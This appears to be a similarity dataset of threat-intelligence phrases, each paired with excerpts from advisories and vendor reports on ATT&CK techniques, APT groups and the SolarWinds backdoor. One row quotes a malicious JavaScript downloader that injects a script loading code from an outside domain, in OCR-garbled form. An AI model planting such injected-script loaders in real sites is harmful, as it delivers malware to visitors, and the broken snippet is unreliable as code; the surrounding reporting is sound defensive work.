phrase|similarity|adjacent_sentences
An adversary may compress and/or encrypt data that is collected prior to exfiltration.|0.8166324374517832|"['Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.', 'Adversaries may execute their own malicious payloads by Dynamic Linker Hijacking T1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.', 'Inter-Process Adversaries may abuse inter-process communication (IPC) T1559 Communication mechanisms for local code or command execution.', 'An adversary may compress and/or encrypt data that is collected Archive Collected Data T1560.003 prior to exfiltration.', 'Adversaries may attempt to hide artifacts associated with their Hide Artifacts T1564 behaviors to evade detection.', 'Adversaries may abuse the Windows service control manager to Service Execution T1569.002 execute malicious commands or payloads.', 'Adversaries may transfer tools or other files between systems in Lateral Tool Transfer T1570 a compromised environment.', 'Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid Protocol Tunneling T1572 detection/network filtering and/or enable access to otherwise unreachable systems.', 'Adversaries may employ a known encryption algorithm to conceal Encrypted Channel T1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.']"
Once established within a system or network, an adversary may use automated techniques for collecting internal data.|0.8605675290658924|['To disguise the source of malicious traffic, adversaries may chain Multi-hop Proxy T1090.003 together multiple proxies.', 'Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.']
APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.|0.8066530274749938|['EnterpriseT1071.001Application Layer Protocol:Web ProtocolsAPT38used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.', '[2]EnterpriseT1217Browser Information DiscoveryAPT38has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.', '[1]EnterpriseT1110Brute ForceAPT38has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.', '[1]EnterpriseT1115Clipboard DataAPT38used a Trojan called KEYLIME to collect data from the clipboard.', '[2]EnterpriseT1059.001Command and Scripting Interpreter:PowerShellAPT38has used PowerShell to execute commands and other operational tasks.', '[1].003Command and Scripting Interpreter:Windows Command ShellAPT38has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victims machine.', '[2].005Command and Scripting Interpreter:Visual BasicAPT38has used VBScript to execute commands and other operational tasks.']
Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.|0.843561094732999|['Since multiple techniques can be mapped to any confirmed threat, the percentages below add up to more than 100 percent.', 'T1059 Command 1 24% of total threats and Scripting Interpreter T1218 Signed Binary 2 19% Process Execution T1543 Create and 3 16% Modify System Process 4 16% T1053 Scheduled Task / Job 5 7% T1003 OS Credential Dumping 6 7% T1055 Process Injection T1027 Obfuscated Files 7 6% or Information 8 5% T1105 Ingress Tool Transfer 9 4% T1569 System Services 10 4% T1036 Masquerading l 10 Top Techniques2021 Threat Detection Report TECHNIQUE T1059 Command and #1 Scripting Interpreter OVERALL RANK Command and Scripting Interpreter tops our list this year thanks in large part to detections associated with two of its sub-techniques: PowerShell and Windows Command Shell.', '72.2% ORGANIZATIONS AFFECTED T1059.001 PowerShell 48.7% 2,366 4,798 ORGANIZATIONS AFFECTED CONFIRMED THREATS PowerShell was the most common technique we observed in 2020, CONFIRMED THREATS affecting nearly half of our customers.', 'It remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike.', 'SEE MORE > T1059.003 Windows Command Shell 38.4% 1,984 ORGANIZATIONS AFFECTED CONFIRMED THREATS While it doesnt do much on its own, Windows Command Shell can call on virtually any executable on the system to execute batch files and arbitrary tasks.', 'SEE MORE > T1059: COMMAND AND SCRIPTING Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.', 'These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms.', 'Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.', '11 SEUQINHCET-BUS TNELAVERP l 11 T1059: Command and Scripting Interpreter2021 Threat Detection Report TECHNIQUE T1059.001 PowerShell #1 PowerShell was the most common technique we observed in 2020, affecting PARENT TECHNIQUE RANK nearly half of our customers.', 'It remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike.', '48.7% Analysis ORGANIZATIONS AFFECTED Why do adversaries use PowerShell?']
Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.|0.8443091975211341|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
Whitefly has used search order hijacking to run the loader Vcrodat.|0.8332628157610411|"['To date, Whitefly has attacked organizations in the healthcare, media, telecommunications, and engineering sectors.', 'How Whitefly compromises its victims https://www.symantec.com/blogs/threat-intelligence/whitefly-espionage-singapore 1/43/7/2019 Whitefly: Espionage Group has Singapore in Its Sights | Symantec Blogs Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.', 'These files frequently purport to offer information on job openings or appear to be documents sent from another organization operating in the same industry as the victim.', 'Given the nature of disguise, its highly likely that they are sent to the victim using spear-phishing emails.', 'If opened, the dropper runs a loader known as Trojan.Vcrodat on the computer.', 'Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.', 'This technique takes advantage of the fact that Windows does not require an application to provide a specific path for a DLL that it wishes to load.', 'If no path is provided, Windows searches for the DLL in specific locations on the computer in a pre-defined order.', 'Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.', 'Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors.', 'The group leverages search order hijacking to assure that its malicious DLLs will be executed.']"
The group also side-loads its backdoor by dropping a library and a legitimate, signed executable .|0.8132535000509582|"['[6].002Email AddressesAPT32has collected e-mail addresses for activists and bloggers in order to target them with spyware.', ""[6]EnterpriseT1564.001Hide Artifacts:Hidden Files and DirectoriesAPT32's macOS backdoor hides the clientID file via a chflags function."", '[10].003Hide Artifacts:Hidden WindowAPT32has used the WindowStyle parameter to concealPowerShellwindows.', '[1][8].004Hide Artifacts:NTFS File AttributesAPT32used NTFS alternate data streams to hide their payloads.', '[8]EnterpriseT1574.002Hijack Execution Flow:DLL Side-LoadingAPT32ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL.', 'The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).', '[4][8][5]EnterpriseT1070.001Indicator Removal:Clear Windows Event LogsAPT32has cleared select event log entries.', '[1].004Indicator Removal:File DeletionAPT32\'s macOS backdoor can receive a ""delete"" command.', '[10].006Indicator Removal:TimestompAPT32has used scheduled task raw XML with a backdated timestamp of June 2, 2016.', 'The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll.', 'Additionally,APT32has used a random value to modify the timestamp of the file storing the clientID.']"
SUNBURST used DNS for C2 traffic designed to mimic normal SolarWinds API communications.|0.778948725266449|['1/9Figure 1: SolarWinds digital signature on software with backdoor Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.', ']com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds- Core-v2019.4.5220-Hotfix5.msp The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.', 'Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration).', 'After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com.', 'The DNS response will return a CNAME record that points to a Command and Control (C2) domain.', 'The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.', 'The list of known malicious infrastructure is available on FireEyes GitHub page.', 'Worldwide Victims Across Multiple Verticals FireEye has detected this activity at multiple entities worldwide.', 'The victims have included government, consulting, technology, telecom and extractive entities in North America, Europe, Asia and the Middle East.', 'We anticipate there are additional victims in other countries and verticals.', 'FireEye has notified all entities we are aware of being affected.']
Adversaries may encode data to make the content of command and control traffic more difficult to detect.|0.8598647414193625|"['Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.']"
Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities.|0.7921129789397879|"['Configure authentication mechanisms to confirm certain user activities on systems, including registering new devices.', ""Page 22 of 27 | Product ID: AA23-347A TLP:CLEARTLP:CLEAR International Partnership VALIDATE SECURITY CONTROLS In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory."", 'FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.', 'To get started: 1.', 'Select an ATT&CK technique described in this advisory (see previous tables).', '2.', 'Align your security technologies against the technique.', '3.', 'Test your technologies against the technique.', '4.', 'Analyze your detection and prevention technologies performance.']"
